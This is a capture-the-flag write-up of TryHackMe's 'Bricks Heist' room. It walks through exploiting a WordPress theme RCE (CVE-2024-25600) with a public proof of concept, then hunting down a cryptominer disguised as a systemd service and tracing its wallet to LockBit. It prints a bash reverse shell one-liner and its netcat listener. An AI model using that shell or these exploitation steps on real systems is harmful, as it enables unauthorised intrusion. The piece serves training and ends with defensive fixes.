# Bricks Heist — TryHackMe Write-up

**Platform:** TryHackMe
**Room:** Bricks Heist
**Target:** `bricks.thm` (`10.10.39.101`)
**Attacking Machine:** Kali Linux


---

## 1. Overview

Bricks Heist is a Linux box built around a WordPress site called **"Brick by Brick."** Unlike a box with a single clean privesc chain, this one is really two separate stories stitched together:

1. A **known CVE in a WordPress theme** (CVE-2024-25600) gives an unauthenticated remote code execution path straight to a shell — no chaining of small bugs required, just correct identification of the vulnerable component.
2. Once inside, the interesting part isn't privilege escalation at all — it's **incident-response / threat-hunting**: a cryptomining service has been planted on the box, disguised inside a legitimate-looking systemd unit, and the goal becomes identifying it, extracting its configuration, and attributing it to a real-world threat actor (**LockBit**) via its Bitcoin wallet.

So the "mindset" for this box is split into two very different modes: exploit-developer mode for the initial foothold, and forensic-analyst mode once you're in.

---

## 2. Reconnaissance

As always, the first move on any box is a full service scan — I want to know what's actually listening before I start guessing at attack surface.

```bash
nmap -A $ip
```

`-A` was used here instead of a more surgical `-sC -sV` because this is a black-box CTF room rather than a live engagement — enabling OS detection and traceroute along with scripts/version detection is cheap and sometimes surfaces useful context (like the WordPress version banner) in one pass.

**Result:**

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Python http.server 3.5 - 3.10
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
|_http-generator: WordPress 6.5
|_http-title: Brick by Brick
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
3306/tcp open  mysql    MySQL (unauthorized)
```

**Reasoning:**

- Port 22 (SSH) — same as always, parked as a *destination* for credentials found later, not directly attackable yet.
- Port 80 running **WebSockify's Python http.server** is an odd, minor detail — it doesn't serve the main site, so I noted it but didn't prioritize it.
- Port 443 is the real target: **Apache + WordPress 6.5**, confirmed both by the `http-generator` banner and the page title "Brick by Brick." `robots.txt` disallowing `/wp-admin/` is itself a confirmation this is a standard WordPress install rather than something custom.
- Port 3306 (MySQL) being open but requiring auth tells me there's a real database backing the site — a possible target *if* I find credentials, but not directly attackable from the outside.

With WordPress confirmed, the natural next step is to enumerate it properly rather than poke at it manually.

---

## 3. WordPress Enumeration

```bash
wpscan --url https://bricks.thm
```

This immediately failed:

```
Scan Aborted: The url supplied 'https://bricks.thm/' seems to be down
(SSL peer certificate or SSH remote key was not OK)
```

**Reasoning:** this is a classic self-signed-certificate problem, not an actual connectivity issue — the earlier Nmap output already showed a self-signed cert (`organizationName=Internet Widgits Pty Ltd`, the OpenSSL default placeholder), which is a strong signal wpscan's TLS verification was simply doing its job and rejecting an untrusted cert. The fix is to tell wpscan not to validate it, since on a lab box I already trust the target:

```bash
wpscan --url https://bricks.thm --disable-tls-checks
```

With TLS checks disabled, the scan completed and enumerated the site's theme and plugin set. Rather than trying generic WordPress core exploits first, I focused on the **theme**, since wpscan flagged it explicitly and a theme is far more likely to be the introduced vulnerability on a purpose-built CTF box than WordPress core itself (core tends to be kept current; themes and plugins are where boxes usually hide the bug).

---

## 4. Exploiting the WordPress Theme Vulnerability

I searched for the theme name and version wpscan reported to see if it had any known CVEs, rather than trying to fuzz for a vulnerability blind — if a component has a public CVE, that's almost always faster and more reliable than manual testing.

This led me to **CVE-2024-25600**, a known unauthenticated remote code execution vulnerability, with a public proof-of-concept exploit available in a public repository.

**Reasoning for going straight to the public PoC:** once a specific CVE is identified with a version match, the efficient move is to pull the existing exploit rather than reimplement it from the advisory — the priority at this stage is establishing a foothold, not proving I can rebuild someone else's RCE from scratch.

After cloning the repository, I had a script (`CVE-2024-25600.py`) that automated the exploit and delivered a shell on the target.

```bash
python3 CVE-2024-25600.py <target details>
```

**Result:** shell access on the box as the low-privileged web service user (`apache`).

---

## 5. Retrieving the First Flag

With a shell established, the first objective was sitting in an oddly-named file in the current working directory — a hash-named `.txt` file, a common CTF pattern for "prove you got code execution here."

```bash
cat 650c844110baced87e1606453b93f22a.txt
```

**Result:**

```
THM{fl46_650c844110b................2a}
```

**Flag #1** confirmed the exploit chain end-to-end: CVE identification → public PoC → RCE → shell.

---

## 6. Stabilizing the Shell

The shell delivered by the exploit script was the usual unstable, non-interactive kind — no job control, no tab completion, breaks on `Ctrl+C`. Before doing any real enumeration I wanted something closer to a real terminal.

I checked what interpreters were actually available on the box first, rather than assuming Python (my usual go-to for a PTY upgrade) would be present:

```bash
bash --version
# GNU bash, version 5.0.17(1)-release (x86_64-pc-linux-gnu)
```

Bash itself was present even though the more typical `python`/`python3` binaries for a one-liner PTY spawn weren't reliable in this shell, so I went with a **bash-native reverse shell** instead of the usual `python -c 'pty.spawn("/bin/bash")'` trick.

I started a listener on my attacking box first — always before triggering the callback, so I don't race the connection:

```bash
nc -lvnp 1337
```

Then triggered the callback from the target shell:

```bash
bash -c 'exec bash -i &>/dev/tcp/[YOUR_IP]/[YOUR_PORT] <&1'
```

This gave a proper interactive bash session over the listener, which is what I used for the rest of the enumeration.

---

## 7. Discovering Hardcoded WordPress Credentials

Part of routine enumeration on any WordPress box is checking `wp-config.php`, since it's the single most common place to find hardcoded database credentials on a real-world (and CTF) WordPress install.

```bash
cat wp-config.php
```

This did turn up hardcoded database credentials. **Reasoning for not chasing this further:** this particular room's later questions didn't require privilege escalation via these credentials  the path forward was explicitly about identifying a *suspicious running service*, not about pivoting to a higher-privileged account. So rather than rabbit-holing into MySQL access that wasn't needed, I logged the finding and moved on to what the room was actually asking for.

---

## 8. Hunting the Suspicious Service

With the objective shifting to "find the suspicious thing running on this box," I listed all active services rather than guessing at process names  a full service enumeration is the fastest way to spot something that doesn't belong.

```bash
systemctl list-units --type=service --state=running
```

One entry stood out immediately: its description contained the string **"TRYHACK3M"** — an obvious, deliberately planted marker rather than something that would appear in a legitimate service description. That's the kind of anomaly that's designed to be spotted once you're looking at the full service list, so I didn't need to dig further to know this was the target.

The **unit name** of that service was the answer to one of the room's questions.

To understand what the service actually did, I inspected its unit file directly:

```bash
systemctl cat <suspicious-unit-name>
```

The `ExecStart` path pointed into `/lib/NetworkManager/` — an unusual location for a legitimate application to live, and a classic persistence trick (hiding a malicious binary/config inside a directory that *looks* like normal system infrastructure so it doesn't draw attention during casual `ls`-ing).

---

## 9. Extracting and Decoding the Miner Configuration

I moved into that directory and started looking through the files there for anything configuration-like, rather than trying to reverse-engineer a binary directly — configs are almost always the faster route to actionable intelligence.

```bash
cd /lib/NetworkManager
ls
cat inet.conf
```

**Result (excerpt):**

```
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
```

This confirmed two things at once: the service is an active **cryptomining process**, and the `ID:` field is some kind of encoded blob — clearly not human-readable, and too structured to be random noise, so worth decoding rather than discarding.

**Reasoning for the decoding approach:** rather than guessing at an encoding scheme by eye, I fed the string into CyberChef's **"Magic"** function, which automatically fingerprints and chains common encodings (base64, hex, etc.) until it lands on readable output. This is the efficient move any time you have an unknown blob and no strong prior about its format — manual guess-and-check on layered encodings wastes time Magic solves in seconds.

The decoded output revealed **two similar-looking Bitcoin wallet addresses**:

```
bc1qyk79fcp9hd5kreprce..........8avt4l67qa
bc1qyk79fcp9ha............h4wrtl8avt4l67qa
```

Two near-identical addresses is a deliberate trap — likely one valid address and one decoy that's *almost* right, designed to catch anyone who doesn't verify before submitting. I checked both against a public blockchain explorer rather than assuming either was correct by inspection, and only the first address resolved to a valid, real wallet.

---

## 10. Threat Attribution

The final objective was identifying which real-world threat group the wallet belonged to. A direct search on the wallet address itself returned nothing useful, so I pivoted the search strategy: rather than searching for the wallet in isolation, I looked at the blockchain explorer's transaction history for that address to find a large associated transfer, then searched for **the receiving address** of that transfer instead.

That search surfaced public reporting tying the receiving wallet to **LockBit**, a well-known ransomware/extortion group — giving a confirmed attribution for the planted miner infrastructure.

---

## 11. Root Cause Summary

| # | Weakness | Where | Real-world equivalent |
|---|----------|-------|------------------------|
| 1 | Unauthenticated RCE via a vulnerable, outdated WordPress theme (CVE-2024-25600) | WordPress theme (port 443) | Unpatched third-party plugin/theme code |
| 2 | Hardcoded database credentials in `wp-config.php` | WordPress install | Hardcoded secrets in application config |
| 3 | Malicious cryptomining service disguised as legitimate system infrastructure | `/lib/NetworkManager/` | Living-off-the-land persistence / masquerading |
| 4 | Miner C2/config data trivially decodable (base64/hex, not encrypted) | `inet.conf` | Weak or absent obfuscation of malicious config |
| 5 | Self-signed TLS certificate on a production-facing site | Port 443 | Poor certificate hygiene, makes MITM/interception easier |

### Suggested fixes (for a real environment)
- Keep WordPress themes and plugins patched and remove unused ones — most WordPress compromises come from the extension ecosystem, not core.
- Never commit database credentials in plaintext inside `wp-config.php`; use environment variables or a secrets manager.
- Monitor for services running from unexpected paths (e.g., a binary launching out of `/lib/NetworkManager/` that isn't NetworkManager) — file-integrity monitoring or EDR would catch this class of masquerading immediately.
- Treat any unexplained CPU/mining activity as a serious incident, not background noise — it's frequently a sign of a broader compromise, not just a nuisance cryptojacker.
- Issue a properly signed TLS certificate instead of relying on a self-signed default.

---

## 12. Timeline / Methodology Recap

1. `nmap -A` → found SSH (22), a minor Python http.server (80), Apache/WordPress 6.5 (443), and MySQL (3306, unauthorized).
2. `wpscan` (with `--disable-tls-checks` to work around the self-signed cert) → enumerated the WordPress theme.
3. Identified the theme's version as vulnerable to **CVE-2024-25600** → used a public PoC → unauthenticated RCE → shell as `apache`.
4. Read a hash-named file in the working directory → **Flag #1 (user-level)**.
5. Stabilized the shell: started a `nc` listener, then triggered a bash-native reverse shell (`bash -c 'exec bash -i &>/dev/tcp/IP/PORT <&1'`).
6. Checked `wp-config.php` → found hardcoded DB credentials (not needed for this room's objectives, so not pursued further).
7. `systemctl list-units --type=service --state=running` → spotted a service with a "TRYHACK3M" marker in its description → identified as a disguised cryptominer.
8. Located the service's execution path in `/lib/NetworkManager/` → read `inet.conf` → found an encoded blob.
9. Decoded the blob via CyberChef Magic → two candidate Bitcoin wallet addresses → verified the correct one via a blockchain explorer.
10. Pivoted from the wallet to its largest associated transaction → identified the receiving address → found public reporting linking it to **LockBit**.

note: Screenshots are available below
![Screenshot:](screenshots/Screenshot%202026-09-09%20at%2009.30.33.png)
![Screenshot:](screenshots/Screenshot%202026-09-09%20at%2009.31.23.png)
![Screenshot:](screenshots/Screenshot%202026-09-09%20at%2009.33.11.png)
![Screenshot:](screenshots/Screenshot%202026-09-09%20at%2009.38.06.png)
![Screenshot:](screenshots/Screenshot%202026-09-09%20at%2010.32.49.png)
![Screenshot:](screenshots/Screenshot%202026-09-10%20at%2013.16.14.png)
![Screenshot:](screenshots/Screenshot%202026-09-10%20at%2013.20.35.png)
![Screenshot:](screenshots/Screenshot%202026-09-10%20at%2013.24.39.png)
![Screenshot:](screenshots/Screenshot%202026-09-10%20at%2013.25.45.png)
![Screenshot:](screenshots/Screenshot%202026-09-10%20at%2013.28.42.png)
![Screenshot:](screenshots/Screenshot%202026-09-10%20at%2013.31.03.png)
![Screenshot:](screenshots/Screenshot%202026-09-10%20at%2013.34.44.png)
![Screenshot:](screenshots/Screenshot%202026-09-10%20at%2013.34.57.png)
![Screenshot:](screenshots/Screenshot%202026-09-10%20at%2013.39.22.png)
---

*End of write-up.*